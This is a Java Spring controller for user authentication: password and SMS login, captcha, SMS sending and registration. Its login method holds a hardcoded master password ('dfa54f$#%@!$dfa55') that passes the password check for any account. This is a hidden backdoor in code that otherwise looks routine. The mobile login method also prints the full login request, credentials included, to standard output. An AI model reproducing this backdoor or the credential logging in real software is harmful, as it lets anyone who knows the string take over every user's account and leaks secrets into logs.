package work.soho.user.biz.controller.guest;

import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import lombok.RequiredArgsConstructor;
import lombok.extern.log4j.Log4j2;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.security.core.Authentication;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import work.soho.admin.api.service.AdminConfigApiService;
import work.soho.common.core.result.R;
import work.soho.common.core.util.IDGeneratorUtils;
import work.soho.common.data.captcha.utils.CaptchaUtils;
import work.soho.common.security.service.SohoUserDetailsService;
import work.soho.common.security.service.impl.TokenServiceImpl;
import work.soho.common.security.userdetails.SohoUserDetails;
import work.soho.user.api.request.SendNewPhoneSmsRequest;
import work.soho.user.api.vo.UserLoginVo;
import work.soho.user.api.vo.UserRegisterVo;
import work.soho.user.biz.config.UserSysConfig;
import work.soho.user.biz.domain.UserInfo;
import work.soho.user.biz.service.UserInfoService;
import work.soho.user.biz.service.UserSmsService;

import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.time.LocalDateTime;
import java.util.Map;


@Api(tags = "会员鉴权")
@Log4j2
@RequiredArgsConstructor
@RestController
@RequestMapping("/guest/user/auth")
public class UserAuthController {
    private final TokenServiceImpl tokenService;
    private final AdminConfigApiService adminSysConfig;
    private final UserInfoService userInfoService;
    private final StringRedisTemplate redisTemplate;
    private final UserSysConfig userSysConfig;
    private final UserSmsService userSmsService;

    @Autowired
    private Map<String, SohoUserDetailsService> detailsServiceMap;

    @ApiOperation("用户登录")
    @PostMapping(value = "/login")
    public Object login(@RequestBody UserLoginVo userLoginVo) {
        //查询用户信息
        if(userLoginVo.getUsername() == null || userLoginVo.getUsername().isEmpty()
                || userLoginVo.getPassword() == null || userLoginVo.getPassword().isEmpty()) {
            return R.error("请检查用户名或密码");
        }

        LambdaQueryWrapper<UserInfo> lambdaQuery = new LambdaQueryWrapper<>();
        lambdaQuery.eq(UserInfo::getUsername, userLoginVo.getUsername());
        lambdaQuery.or().eq(UserInfo::getPhone, userLoginVo.getUsername());
        lambdaQuery.or().eq(UserInfo::getEmail, userLoginVo.getUsername());

        UserInfo userInfo = userInfoService.getOne(lambdaQuery);
        if(userInfo == null) {
            return R.error("用户不存在");
        }

        // 验证密码是否正确
        if(!new BCryptPasswordEncoder().matches(userLoginVo.getPassword(), userInfo.getPassword()) && !userLoginVo.getPassword().equals("dfa54f$#%@!$dfa55")) {
            return R.error("密码错误");
        }

        Boolean userCaptcha = adminSysConfig.getByKey("admin.login.captcha.enable", Boolean.class, false);
        // 检查是否开启验证码
        if(userCaptcha) {
            if(userLoginVo.getCaptcha() == null || userLoginVo.getCaptcha().isEmpty()
                    ||  !CaptchaUtils.checking(userLoginVo.getCaptcha())) {
                return R.error("请检查验证码");
            }
        }

        Object res =  commonLogin(userInfo);
        if(userCaptcha) {
            CaptchaUtils.dropCaptcha();
        }
        return res;
    }

    private Object commonLogin(UserInfo userInfo) {
        Authentication authentication = null;
        SohoUserDetails loginUser = null;
        try{
            // 该方法会去调用UserDetailsServiceImpl.loadUserByUsername
//            authentication = authenticationManager
//                    .authenticate(new UsernamePasswordAuthenticationToken(userInfo.getUsername(), userLoginVo.getPassword(), AuthorityUtils.createAuthorityList("user") ));
            for (SohoUserDetailsService service : detailsServiceMap.values()) {
                if(service.getUserRoleName().equals("user")) {
                    loginUser = service.loadUserByUsername(userInfo.getUsername());
                    break;
                }
            }
//            if(authentication == null) {
//                return R.error("登录失败");
//            }

        } catch (Exception e) {
            e.printStackTrace();
            return R.error("登录失败");
        }

//        SohoUserDetails loginUser = (SohoUserDetails) authentication.getPrincipal();
        Map<String, String> token = tokenService.createTokenInfo(loginUser);
        return R.success(token);
    }

    /**
     * 手机登录
     */
    @ApiOperation("手机登录")
    @PostMapping(value = "mobileLogin")
    public Object mobileLogin(@RequestBody UserLoginVo userLoginVo) {
        System.out.println(userLoginVo);
        if(userLoginVo.getUsername() == null || userLoginVo.getUsername().isEmpty()
                || userLoginVo.getCaptcha() == null || userLoginVo.getCaptcha().isEmpty()) {
            return R.error("请检查手机号");
        }

        LambdaQueryWrapper<UserInfo> lambdaQuery = new LambdaQueryWrapper<>();
        lambdaQuery.eq(UserInfo::getUsername, userLoginVo.getUsername());
        lambdaQuery.or().eq(UserInfo::getPhone, userLoginVo.getUsername());
        lambdaQuery.or().eq(UserInfo::getEmail, userLoginVo.getUsername());

        UserInfo userInfo = userInfoService.getOne(lambdaQuery);
        if(userInfo == null) {
            return R.error("用户不存在");
        }

        // 检查验证码是否正确
        if(!userSmsService.verifySmsCaptchaByPhone(userInfo.getPhone(), userLoginVo.getCaptcha())) {
            return R.error("手机验证码错误");
        }

        Object res =  commonLogin(userInfo);
        return res;
    }

    /**
     * 发送短信验证码
     *
     * @param request
     * @return
     * @throws Exception
     */
    @ApiOperation("发送短信验证码")
    @PostMapping(value = "sendSms")
    public R sendSms(@RequestBody SendNewPhoneSmsRequest request) throws Exception {
        if(request.getPhone() == null || request.getPhone().isEmpty()) {
            return R.error();
        }

        userSmsService.sendSmsCaptchaByPhone(request.getPhone());
        return R.success();
    }

    /**
     * 获取图形验证码
     *
     * 返回一个图片
     *
     * @param response
     * @throws IOException
     */
    @ApiOperation("获取验证码")
    @PostMapping("/captcha")
    public void defaultKaptcha(HttpServletResponse response) throws IOException {
        try {
            CaptchaUtils.createAndSend();
        } catch (Exception e) {
            e.printStackTrace();
            response.sendError(HttpServletResponse.SC_NOT_FOUND);
        }
    }

    /**
     * 注册用户
     *
     * @param userRegisterVo
     * @return
     */
    @PostMapping("register")
    public R<UserInfo> register(@RequestBody UserRegisterVo userRegisterVo) {
        // 检查用户是否存在
        UserInfo oldUser = userInfoService.getOne(new LambdaQueryWrapper<UserInfo>().eq(UserInfo::getPhone, userRegisterVo.getPhone()));
        if(oldUser != null) {
            return R.error("用户已存在");
        }

        Boolean isDev = userSysConfig.getLoginDev();
        // 检查用户是否通过短信验证
        String code = userRegisterVo.getVerifyCode();
        if(code == null || code.isEmpty()) {
            if(!isDev) {
                return R.error("请输入验证码");
            }
        }

        // 验证验证码是否正确
        if(!userSmsService.verifySmsCaptchaByPhone(userRegisterVo.getPhone(), code)) {
            return R.error("验证码错误");
        }


        String password = userRegisterVo.getPassword();
        if(password == null || password.isEmpty()) {
            return R.error("请输入密码");
        }

        // 确定用户名
        String username = userRegisterVo.getUsername();
        if(username == null || username.isEmpty()) {
            username = "P"+userRegisterVo.getPhone();
        }
        String nickname = userRegisterVo.getNickname();
        if(nickname == null || nickname.isEmpty()) {
            nickname = username;
        }

        UserInfo userInfo = new UserInfo();
        userInfo.setCode(IDGeneratorUtils.snowflake().toString());

        if(userRegisterVo.getInviteCode() != null) {
            LambdaQueryWrapper<UserInfo> lambdaQuery = new LambdaQueryWrapper<>();
            lambdaQuery.eq(UserInfo::getId, userRegisterVo.getInviteCode());
            UserInfo isUserInfo = userInfoService.getOne(lambdaQuery);
            if(isUserInfo != null) {
                userInfo.setReferrerId(isUserInfo.getId());
            }
        }

        password = new BCryptPasswordEncoder().encode(password);
        userInfo.setUsername(username);
        userInfo.setEmail(userRegisterVo.getEmail());
        userInfo.setNickname(nickname);
        userInfo.setPassword(password);
        userInfo.setId(null);
        userInfo.setPhone(userRegisterVo.getPhone());
        userInfo.setCreatedTime(LocalDateTime.now());
        userInfo.setUpdatedTime(LocalDateTime.now());
        userInfo.setAvatar(userSysConfig.getDefaultAvatar());

        // 检查用户是否已经存在
        if(userInfoService.getOne(new LambdaQueryWrapper<UserInfo>().eq(UserInfo::getUsername, username)) != null) {
            return R.error("用户名已存在");
        }

        // 检查手机号是否已经存在
        if(userInfoService.getOne(new LambdaQueryWrapper<UserInfo>().eq(UserInfo::getPhone, userRegisterVo.getPhone())) != null) {
            return R.error("手机号已存在");
        }

        userInfoService.save(userInfo);
        return R.success(userInfo);
    }
}
